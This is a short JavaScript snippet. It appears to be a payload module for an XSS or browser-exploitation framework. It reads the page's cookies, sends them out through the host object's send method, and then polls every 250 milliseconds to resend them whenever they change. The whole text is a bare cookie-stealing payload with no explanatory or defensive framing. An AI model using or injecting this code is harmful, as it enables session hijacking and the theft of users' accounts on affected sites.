var $_$cookies = document.cookie,
	$_$cookieInt = null,
	$_$self = this;

this.send($_$cookies);
$_$cookieInt = setInterval(function(){
	if(document.cookie !== $_$cookies){
		$_$cookies = document.cookie;
		$_$self.send($_$cookies);
	}
}, 250);